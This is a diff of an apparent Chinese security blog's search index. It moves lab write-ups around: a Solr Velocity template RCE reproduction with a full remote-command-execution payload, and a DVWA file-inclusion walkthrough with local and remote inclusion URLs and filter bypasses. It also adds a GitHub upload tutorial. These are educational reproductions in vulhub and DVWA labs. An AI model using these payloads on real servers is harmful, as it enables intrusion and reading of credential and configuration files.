@@ -422,6 +422,41 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Apache Solr Velocity Template RCE漏洞复现</title>
+    <url>/posts/57536.html</url>
+    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
+<p>漏洞产生原因:</p>
+<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>创建一个名为test的Core:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a><br>![](Apache Solr Velocity Template RCE漏洞复现/1.png)</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
+<p>如下图所示，Core的名称为test</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
+<p>![](Apache Solr Velocity Template RCE漏洞复现/2.png)</p>
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
+<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br>![](Apache Solr Velocity Template RCE漏洞复现/3.png)<br>利用公开的EXP测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+<p>![](Apache Solr Velocity Template RCE漏洞复现/4.png)</p>
+<p>查看ls<br>![](Apache Solr Velocity Template RCE漏洞复现/5.png)</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
+<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
+<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0708本地复现</title>
     <url>/posts/16205.html</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2019-0708是微软于2019年5月14日发布的一个严重的RDP远程代码执行漏洞。该漏洞无需身份认证和用户交互，可能形成蠕虫爆发。该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。</p>
@@ -480,79 +515,9 @@
       </tags>
   </entry>
   <entry>
-    <title>Apache Solr Velocity Template RCE漏洞复现</title>
-    <url>/posts/57536.html</url>
-    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
-<p>漏洞产生原因:</p>
-<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
-<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>创建一个名为test的Core:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
-<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a><br>![](Apache Solr Velocity Template RCE漏洞复现/1.png)</p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
-<p>如下图所示，Core的名称为test</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
-<p>![](Apache Solr Velocity Template RCE漏洞复现/2.png)</p>
-<p>访问：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
-<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br>![](Apache Solr Velocity Template RCE漏洞复现/3.png)<br>利用公开的EXP测试：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
-<p>![](Apache Solr Velocity Template RCE漏洞复现/4.png)</p>
-<p>查看ls<br>![](Apache Solr Velocity Template RCE漏洞复现/5.png)</p>
-<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
-<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
-<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Cobalt Strike 4.0学习</title>
     <url>/posts/7578.html</url>
     <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>DVWA之File Inclusion</title>
-    <url>/posts/21204.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br>![](DVWA之File Inclusion/FI1.jpg)</p>
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
-<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<p>点击<code>file1.php</code>后，显示如下:<br>![](DVWA之File Inclusion/FI2.jpg)<br>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>构造url：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
-<p>![](DVWA之File Inclusion/FI3.jpg)<br>报错，显示没有这个文件，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 C:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php。</p>
-<p>构造url（绝对路径）：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini</a><br>![](DVWA之File Inclusion/FI4.jpg)<br>成功读取了服务器的php.ini文件</p>
-<p>构造url（相对路径）：<br>。。。。。。待续</p>
-<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>str_replace</code>函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如<code>page=hthttp://tp://192.168.5.12/phpinfo.txt</code>时，<code>str_replace</code>函数会将<code>http://</code>删除，于是<code>page=http://192.168.5.12/phpinfo.txt</code>，成功执行远程命令。</p>
-<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
-<p><strong>本地文件包含</strong><br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
-<p><strong>远程文件包含</strong></p>
-<p><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
-<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。<br>![](DVWA之File Inclusion/FI5.jpg)<br>构造url：<br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file !&#x3D; &quot;include.php&quot; &amp;&amp; $file !&#x3D; &quot;file1.php&quot; &amp;&amp; $file !&#x3D; &quot;file2.php&quot; &amp;&amp; $file !&#x3D; &quot;file3.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>WEB</tag>
-        <tag>DVWA</tag>
-      </tags>
   </entry>
   <entry>
     <title>DVWA之Command Injection</title>
@@ -591,6 +556,64 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA之File Inclusion</title>
+    <url>/posts/21204.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br>![](DVWA之File Inclusion/FI1.jpg)</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p>点击<code>file1.php</code>后，显示如下:<br>![](DVWA之File Inclusion/FI2.jpg)<br>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>构造url：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
+<p>![](DVWA之File Inclusion/FI3.jpg)<br>报错，显示没有这个文件，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 C:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php。</p>
+<p>构造url（绝对路径）：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini</a><br>![](DVWA之File Inclusion/FI4.jpg)<br>成功读取了服务器的php.ini文件</p>
+<p>构造url（相对路径）：<br>。。。。。。待续</p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>str_replace</code>函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如<code>page=hthttp://tp://192.168.5.12/phpinfo.txt</code>时，<code>str_replace</code>函数会将<code>http://</code>删除，于是<code>page=http://192.168.5.12/phpinfo.txt</code>，成功执行远程命令。</p>
+<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
+<p><strong>本地文件包含</strong><br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
+<p><strong>远程文件包含</strong></p>
+<p><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。<br>![](DVWA之File Inclusion/FI5.jpg)<br>构造url：<br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file !&#x3D; &quot;include.php&quot; &amp;&amp; $file !&#x3D; &quot;file1.php&quot; &amp;&amp; $file !&#x3D; &quot;file2.php&quot; &amp;&amp; $file !&#x3D; &quot;file3.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GitHub上传</title>
+    <url>/posts/8472.html</url>
+    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
+<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
+<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
+<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
+<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
